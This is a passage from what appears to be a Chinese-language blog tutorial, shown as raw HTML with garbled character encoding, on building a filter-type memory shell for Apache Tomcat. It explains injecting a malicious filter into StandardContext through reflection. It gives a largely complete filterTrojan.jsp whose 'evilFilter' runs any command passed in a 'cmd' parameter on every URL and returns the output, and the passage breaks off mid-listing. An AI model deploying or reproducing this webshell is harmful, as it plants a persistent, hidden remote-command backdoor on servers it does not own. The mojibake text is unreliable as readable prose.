http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.example.filterDemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demo<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æä¹‹å‰åœ¨é¡¹ç›®ç»“æ„-&gt;æ¨¡å—-&gt;ä¾èµ–é‡Œå¯¼å…¥tomcat&#x2F;libçš„åŒ…</p><blockquote><p>å¦‚æœå¯ä»¥æŠŠè‡ªå·±åˆ›å»ºçš„FilterMapæ”¾åœ¨FilterMapsçš„æœ€å‰é¢ï¼ŒurlpatternåŒ¹é…åˆ°çš„æ—¶å€™ï¼Œå°±èƒ½æŠŠæ¶æ„FilterConfigæ·»åŠ åˆ°FilterChainä¸­ï¼Œç„¶åè§¦å‘shell</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153131060.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153131060.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>filterChainæ¥è‡ªcreatFilterChain</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153326017.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153326017.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>FilterDefs</strong>ï¼šå­˜æ”¾FilterDefçš„æ•°ç»„ ï¼Œ<strong>FilterDef</strong> ä¸­å­˜å‚¨ç€æˆ‘ä»¬è¿‡æ»¤å™¨åï¼Œè¿‡æ»¤å™¨å®ä¾‹ï¼Œä½œç”¨ url ç­‰åŸºæœ¬ä¿¡æ¯</p><p><strong>FilterConfigs</strong>ï¼šå­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨ <strong>FilterConfig</strong> ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ Filterå¯¹è±¡ç­‰ä¿¡æ¯</p><p><strong>FilterMaps</strong>ï¼šå­˜æ”¾FilterMapçš„æ•°ç»„ï¼Œåœ¨ <strong>FilterMap</strong> ä¸­ä¸»è¦å­˜æ”¾äº† FilterName å’Œ å¯¹åº”çš„URLPattern</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153646187.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153646187.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="å®¹å™¨ç»„ä»¶"><a href="#å®¹å™¨ç»„ä»¶" class="headerlink" title="å®¹å™¨ç»„ä»¶"></a>å®¹å™¨ç»„ä»¶</h2><p><a href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w">https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w</a></p><ul><li>servletContextå’ŒStandardContextçš„å…³ç³»</li></ul><p>Tomcatä¸­ServletContextå®ç°ç±»ä¸ºApplicationContextã€‚ApplicationContextå®ä¾‹ä¸­åˆåŒ…å«äº†StandardContextå®ä¾‹ï¼Œä»¥æ­¤æ¥è·å–æ“ä½œTomcatå®¹å™¨å†…éƒ¨çš„ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚Servletçš„æ³¨å†Œç­‰ã€‚</p><p>ç”±äºæ­£å¸¸ç¯å¢ƒä¸èƒ½ç›´æ¥ä¿®æ”¹web.xmlã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡åå°„ç”Ÿæˆæ¶æ„filterDefsã€filterConfigã€filterMapsï¼Œä¸‰ä¸ªä¸€èµ·æ”¾å…¥Contextå°±èµ·åˆ°äº†web.xmlæ³¨å†Œä¸€æ ·çš„æ•ˆæœ</p><p>è¦å®ç°filterå‹å†…å­˜é©¬ï¼Œéœ€è¦ç»è¿‡ï¼š</p><ol><li>åˆ›å»ºæ¶æ„filter</li><li>ç”¨filterDefå¯¹filterè¿›è¡Œå°è£…</li><li>å°†filterDefæ·»åŠ åˆ°filterDefsè·ŸfilterConfigsä¸­</li><li>åˆ›å»ºä¸€ä¸ªæ–°çš„filterMapå°†URLè·Ÿfilterè¿›è¡Œç»‘å®šï¼Œå¹¶æ·»åŠ åˆ°filterMapsä¸­</li></ol><p>å› ä¸ºfilterç”Ÿæ•ˆä¼šæœ‰ä¸€ä¸ªå…ˆåé¡ºåºï¼Œæ‰€ä»¥ä¸€èˆ¬æ¥è®²æˆ‘ä»¬è¿˜éœ€è¦æŠŠæˆ‘ä»¬çš„filterç»™ç§»åŠ¨åˆ°FilterChainçš„ç¬¬ä¸€ä½å»ã€‚</p><p>æ¯æ¬¡è¯·æ±‚createFilterChainéƒ½ä¼šä¾æ®æ­¤åŠ¨æ€ç”Ÿæˆä¸€ä¸ªè¿‡æ»¤é“¾ï¼Œè€ŒStandardContextåˆä¼šä¸€ç›´ä¿ç•™åˆ°Tomcatç”Ÿå‘½å‘¨æœŸç»“æŸï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å†…å­˜é©¬å°±å¯ä»¥ä¸€ç›´é©»ç•™ä¸‹å»ï¼Œç›´åˆ°Tomcaté‡å¯ã€‚</p><p>åœ¨Tomcat 7.xä»¥ä¸Šæ‰æ”¯æŒServlet3ï¼Œè€Œjava.servlet.DispatcherTypeç±»åœ¨servlet3æ‰å¼•å…¥ã€‚æ‰€ä»¥filterå‹å†…å­˜é©¬éœ€è¦Tomcat7ä»¥ä¸Š</p><h2 id="ä¸€ã€Filterå†…å­˜é©¬"><a href="#ä¸€ã€Filterå†…å­˜é©¬" class="headerlink" title="ä¸€ã€Filterå†…å­˜é©¬"></a>ä¸€ã€Filterå†…å­˜é©¬</h2><h3 id="1-è·å–context"><a href="#1-è·å–context" class="headerlink" title="1.è·å–context"></a>1.è·å–context</h3><p>servletæä¾›äº†request.getSession().getServletContext()è·å–servletContext</p><p>ä¸è¿‡è¯¥æ–¹æ³•ç›´æ¥è·å–åˆ°çš„æ˜¯ApplicationContextFacadeï¼Œå®ƒå°è£…äº†ApplicationContextã€‚ç„¶åApplicationContextå°è£…äº†StandardContext</p><blockquote><p>è¡¨è¾¾å¼((RequestFacade)servletRequest).request.getSession().getServletContext()</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227163112042.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227163112042.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å› æ­¤è°ƒä¸¤æ¬¡åå°„å°±èƒ½æ‹¿åˆ°StandardContext</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸è¿‡servletç¯å¢ƒçš„requestå®é™…ä¸Šä¸ºRequestFacadeå¯¹è±¡ï¼Œå®ƒçš„requestå±æ€§å­˜å‚¨äº†Requestå¯¹è±¡ï¼ŒRequestå¯¹è±¡çš„getContextèƒ½ç›´æ¥æ‹¿åˆ°Context</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227162536522.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227162536522.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-æ·»åŠ FilterDefs"><a href="#2-æ·»åŠ FilterDefs" class="headerlink" title="2.æ·»åŠ FilterDefs"></a>2.æ·»åŠ FilterDefs</h3><p>FilterDefæä¾›äº†setFilteræ¥ä¿®æ”¹filter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227205553231.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227205553231.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç„¶åç”¨StandardContext#addFilterDef()æ¥æ·»åŠ FilterDefs</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227205817618.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227205817618.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”Ÿæˆæ¶æ„filter:æ¥æ”¶cmdä½œä¸ºå‚æ•°ï¼ŒSystem.getProperty(os.name)è·å–ç³»ç»Ÿå˜é‡ï¼Œç”¨æ¥åˆ¤å®šç³»ç»Ÿä¸ºLinux or windowsã€‚ç„¶åè°ƒç”¨Runtime#exec()è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            response.getWriter().write(output);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure><p><code>Scanner(in).useDelimiter(&quot;\\A&quot;);</code>scannnerè¯»å…¥æ‰€æœ‰è¾“å…¥ï¼ŒåŒ…æ‹¬å›è½¦å’Œæ¢è¡Œç¬¦ï¼ˆé»˜è®¤è¯»åˆ°ç©ºæ ¼åœæ­¢ï¼Œ<code>\\A</code>è¡¨ç¤ºä»¥æ–‡æœ¬å¼€å¤´ä½œä¸ºåˆ†éš”ç¬¦åˆ†å‰²æ–‡æœ¬)</p><p>å°†outputå†™å…¥responseï¼Œè·å–å®Œå‚æ•°å°†requestå’Œresponseä½œä¸ºå›è°ƒå‚æ•°è°ƒç”¨doFilterã€‚</p><p>é‡ç‚¹åœ¨äºsetFilterä¿®æ”¹filterï¼Œç„¶åä½¿ç”¨standardContext.addFilter()æ·»åŠ FilterDefs</p><h3 id="3-filterConfigå°è£…filterDefsï¼Œå¹¶æ·»åŠ åˆ°filterConfigs"><a href="#3-filterConfigå°è£…filterDefsï¼Œå¹¶æ·»åŠ åˆ°filterConfigs" class="headerlink" title="3.filterConfigå°è£…filterDefsï¼Œå¹¶æ·»åŠ åˆ°filterConfigs"></a>3.filterConfigå°è£…filterDefsï¼Œå¹¶æ·»åŠ åˆ°filterConfigs</h3><p>åˆ©ç”¨åå°„è·å–filterConifigsï¼ŒfilterConfigså®é™…ä¸Šæ˜¯ä¸ªhashmapï¼Œputè¿›å»å°±è¡Œäº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227213830277.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227213830277.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å‰é¢è¯´è¿‡äº†ï¼ŒstandardContextå®é™…ä¸Šæ˜¯ApplicationFilterConfigContextå°è£…çš„ã€‚</p><p>åˆ©ç”¨ApplicationFilterConfigContextæ„é€ å‡½æ•°æ¥å°è£…filterfDefsï¼Œä¸è¿‡è¯¥æ„é€ å‡½æ•°æ— ä¿®é¥°ç¬¦ï¼Œä¸ºdefaultï¼ˆåŒåŒ…å¯ç”¨ï¼‰ï¼Œä½¿ç”¨åå°„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227212217994.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227212217994.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">   constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">   <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">   <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">   filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">   <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">   filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-ç”ŸæˆfilterMapæ·»åŠ åˆ°filterMaps"><a href="#4-ç”ŸæˆfilterMapæ·»åŠ åˆ°filterMaps" class="headerlink" title="4.ç”ŸæˆfilterMapæ·»åŠ åˆ°filterMaps"></a>4.ç”ŸæˆfilterMapæ·»åŠ åˆ°filterMaps</h3><p>filterMapséœ€è¦è®¾ç½®åç§°ï¼Œpatternï¼Œdispatcher</p><p>è¿™é‡Œçš„dispatcheréœ€è¦è®¾ç½®ä¸ºDispatcherType.REQUESTï¼Œè¯¥é€‰é¡¹æŒ‡å®šäº†filterè¿‡æ»¤å™¨æ ¹æ®DispatcherTypeçš„ç±»å‹æ˜¯å¦æ‰§è¡Œã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆéœ€è¦tomcat7ä»¥ä¸Šçš„åŸå› </p><p>FilterMapså¯ä»¥ç”¨ä¸¤ç§æ–¹å¼æ·»åŠ mapï¼šaddFilterMap æˆ–è€…addFilterMapBefore()ï¼Œåè€…å¯ä»¥å°†filteræ·»åŠ è‡³æœ€å‰é¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br></pre></td></tr></table></figure><p>å°†æŠ½è±¡ç±»çš„æ–¹æ³•è¡¥å…¨å°±èƒ½ç”¨äº†</p><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filterTrojan.jsp</span></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContextFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">  <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">          isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        response.getWriter().write(output);</span><br><span class="line">        response.getWriter().flush();</span><br><span class="line">      &#125;</span><br><span class="line">      chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">  filterDef.setFilter(filter);</span><br><span class="line">  filterDef.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">  filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">  standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">  <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">  constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">  <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">  filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">Map</span> <span class="variable">filterConfigs</span> <span 